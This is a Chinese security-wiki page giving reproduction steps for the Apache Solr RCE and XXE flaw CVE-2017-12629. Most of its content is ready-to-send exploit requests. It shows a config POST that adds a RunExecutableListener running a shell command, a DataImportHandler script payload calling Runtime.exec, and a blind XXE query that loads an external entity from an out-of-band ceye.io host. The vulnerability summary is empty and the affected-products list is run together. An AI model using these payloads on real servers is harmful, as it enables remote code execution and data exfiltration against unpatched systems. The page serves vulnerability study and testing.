<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Apache%20Solr/%EF%BC%88CVE-2017-12629%EF%BC%89Apache%20Solr%20rce%26xxe%20%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE-2017-12629）Apache Solr rce&amp;xxe 漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\uff08CVE-2017-12629\uff09Apache Solr rce\u0026amp;xxe \u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_4" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2019-0192%EF%BC%89Apache%20Solr%20Deserialization%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2019-0192%EF%BC%89Apache%20Solr%20Deserialization%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2019-0192）Apache Solr Deserialization 远程代码执行漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Apache-Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Apache-Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="btn btn-xs btn-link">
        Apache-Solr 任意文件读取漏洞复现
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2017-12629apache-solr-rcexxe">（CVE-2017-12629）Apache Solr rce&amp;xxe 漏洞<a class="headerlink" href="#cve-2017-12629apache-solr-rcexxe" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>Redhat Single Sign-On 7.0+ Redhat Linux 6.2 E sparc+ Redhat Linux 6.2 E i386+ Redhat Linux 6.2 E alpha+ Redhat Linux 6.2 sparc+ Redhat Linux 6.2 i386+ Redhat Linux 6.2 alphaRedhat JBoss Portal Platform 6Redhat JBoss EAP 7 0Redhat Jboss EAP 6Redhat JBoss Data Grid 7.0.0Redhat Enterprise Linux 6+ Trustix Secure Enterprise Linux 2.0+ Trustix Secure Linux 2.2+ Trustix Secure Linux 2.1+ Trustix Secure Linux 2.0Redhat Collections for Red Hat Enterprise Linux 0Apache Solr 6.6.1Apache Solr 6.6Apache Solr 6.5.1Apache Solr 6.5Apache Solr 6.4Apache Solr 6.3Apache Solr 6.2Apache Solr 6.6Apache Solr 6.3Apache Solr 6.0Apache Lucene 0</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="rce">rce 姿势一<a class="headerlink" href="#rce" title="Permanent link">&para;</a></h3>
<ul>
<li>首先创建一个listener，其中设置exe的值为我们想执行的命令，args的值是命令参数：</li>
</ul>
<p><div class="highlight"><pre><span></span><code>&lt;!-- --&gt;
</code></pre></div>
    POST /solr/demo/config HTTP/1.1
    Host: 10.0.83.79:8983
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36
    Accept: <em>/</em>
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    Content-Length: 158</p>
<div class="codehilite"><pre><span></span><code>{&quot;add-listener&quot;:{&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;newlistener&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;touch /tmp/success&quot;]}}
</code></pre></div>

<p><img alt="" src="../resource/%28CVE-2017-12629%29ApacheSolrrce%26xxe%E6%BC%8F%E6%B4%9E/media/rId25.png" /></p>
<p>在solr管理界面新建了listen</p>
<p><img alt="" src="../resource/%28CVE-2017-12629%29ApacheSolrrce%26xxe%E6%BC%8F%E6%B4%9E/media/rId26.png" /></p>
<ul>
<li>然后进行update操作，触发刚才添加的listener：</li>
</ul>
<p><div class="highlight"><pre><span></span><code>&lt;!-- --&gt;
</code></pre></div>
    POST /solr/demo/update HTTP/1.1
    Host: 10.0.83.79:8983
    Accept: <em>/</em>
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/json
    Content-Length: 15</p>
<div class="codehilite"><pre><span></span><code>[{&quot;id&quot;:&quot;test&quot;}]
</code></pre></div>

<p><img alt="" src="../resource/%28CVE-2017-12629%29ApacheSolrrce%26xxe%E6%BC%8F%E6%B4%9E/media/rId27.png" /></p>
<h3 id="rce_1">rce 姿势二<a class="headerlink" href="#rce_1" title="Permanent link">&para;</a></h3>
<p><img alt="" src="../resource/%28CVE-2017-12629%29ApacheSolrrce%26xxe%E6%BC%8F%E6%B4%9E/media/rId29.png" /></p>
<p>如上图所示，首先打开刚刚创建好的<code>test</code>核心，选择Dataimport功能并选择debug模式，填入以下POC：</p>
<div class="codehilite"><pre><span></span><code><span class="nt">&lt;dataConfig&gt;</span>
<span class="w">  </span><span class="nt">&lt;dataSource</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;URLDataSource&quot;</span><span class="nt">/&gt;</span>
<span class="w">  </span><span class="nt">&lt;script&gt;</span><span class="cp">&lt;![CDATA[</span>
<span class="cp">          function poc(){ java.lang.Runtime.getRuntime().exec(&quot;touch /tmp/success&quot;);</span>
<span class="cp">          }</span>
<span class="cp">  ]]&gt;</span><span class="nt">&lt;/script&gt;</span>
<span class="w">  </span><span class="nt">&lt;document&gt;</span>
<span class="w">    </span><span class="nt">&lt;entity</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;stackoverflow&quot;</span>
<span class="w">            </span><span class="na">url=</span><span class="s">&quot;https://stackoverflow.com/feeds/tag/solr&quot;</span>
<span class="w">            </span><span class="na">processor=</span><span class="s">&quot;XPathEntityProcessor&quot;</span>
<span class="w">            </span><span class="na">forEach=</span><span class="s">&quot;/feed&quot;</span>
<span class="w">            </span><span class="na">transformer=</span><span class="s">&quot;script:poc&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
<span class="w">  </span><span class="nt">&lt;/document&gt;</span>
<span class="nt">&lt;/dataConfig&gt;</span>
</code></pre></div>

<p>点击<code>Execute with this Confuguration</code>会发送以下请求包：</p>
<p>payload(这里我直接填无法命令执行替换如下payload)</p>
<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/solr/test/dataimport?_=1565835261600&amp;indent=on&amp;wt=json</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">10.0.83.79:8983</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">application/json, text/plain, */*</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Content-type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="na">X-Requested-With</span><span class="o">:</span> <span class="l">XMLHttpRequest</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">679</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">csrftoken=gzcSR6Sj3SWd3v4ZxmV5OcZuPKbOhI6CMpgp5vIMvr5wQAL4stMtxJqL2sUE8INi; sessionid=snzojzqa5zn187oghf06z6xodulpohpr</span>

<span class="nt">command</span><span class="o">=</span><span class="s">full-import</span><span class="p">&amp;</span><span class="nt">verbose</span><span class="o">=</span><span class="s">false</span><span class="p">&amp;</span><span class="nt">clean</span><span class="o">=</span><span class="s">false</span><span class="p">&amp;</span><span class="nt">commit</span><span class="o">=</span><span class="s">true</span><span class="p">&amp;</span><span class="nt">debug</span><span class="o">=</span><span class="s">true</span><span class="p">&amp;</span><span class="nt">core</span><span class="o">=</span><span class="s">test</span><span class="p">&amp;</span><span class="nt">dataConfig</span><span class="o">=</span><span class="s">%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22touch+%2Ftmp%2Fsuccess%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%22XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E</span><span class="p">&amp;</span><span class="nt">name</span><span class="o">=</span><span class="s">dataimport</span>
</code></pre></div>

<p><img alt="" src="../resource/%28CVE-2017-12629%29ApacheSolrrce%26xxe%E6%BC%8F%E6%B4%9E/media/rId30.png" /></p>
<h3 id="xxe">xxe<a class="headerlink" href="#xxe" title="Permanent link">&para;</a></h3>
<p>由于返回包中不包含我们传入的XML中的信息，所以这是一个Blind
XXE漏洞，我们发送如下数据包（自行修改其中的XXE Payload）：</p>
<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/solr/demo/select?q=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3C%21DOCTYPE%20root%20%5B%0A%3C%21ENTITY%20%25%20remote%20SYSTEM%20%22http%3A//xxe.rqe94e.ceye.io/%22%3E%0A%25remote%3B%5D%3E%0A%3Croot/%3E&amp;wt=xml&amp;defType=xmlparser</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">your-ip:8983</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
</code></pre></div>

<p>使用<code>ceye</code></p>
<p>发送payload</p>
<p><img alt="" src="../resource/%28CVE-2017-12629%29ApacheSolrrce%26xxe%E6%BC%8F%E6%B4%9E/media/rId32.png" /></p>
<p>ceye接收</p>
<p><img alt="" src="../resource/%28CVE-2017-12629%29ApacheSolrrce%26xxe%E6%BC%8F%E6%B4%9E/media/rId33.png" /></p>
<h2 id="_4">参考链接<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://wh0ale.github.io/2019/08/26/Apache-Solr安全问题/">https://wh0ale.github.io/2019/08/26/Apache-Solr安全问题/</a></p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2019-0192%EF%BC%89Apache%20Solr%20Deserialization%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2019-0192%EF%BC%89Apache%20Solr%20Deserialization%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2019-0192）Apache Solr Deserialization 远程代码执行漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Apache-Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Apache-Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="btn btn-xs btn-link">
        Apache-Solr 任意文件读取漏洞复现
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>